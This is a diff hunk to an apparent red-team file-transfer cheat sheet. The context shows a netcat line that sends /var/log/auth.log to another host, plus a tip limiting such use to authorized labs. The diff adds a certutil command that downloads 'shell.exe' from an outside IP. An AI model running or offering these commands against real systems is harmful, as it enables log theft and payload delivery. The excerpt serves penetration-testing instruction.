@@ -370,6 +370,10 @@ nc 192.168.1.100 4445 < /var/log/auth.log
 > {: .prompt-tip }
 > Netcat transfers are **unencrypted** and **unauthenticated**. Easily detected by EDR/IDS. Use only for authorized red team exercises or isolated labs. Verify file hashes post-transfer: `certutil -hashfile file.exe SHA256` (Windows) / `sha256sum file.exe` (Linux).
 
+```text
+certutil.exe -urlcache -f http://192.168.1.22:1000/shell.exe shell.exe
+```
+
 ---
 
 ## Comparison Matrix
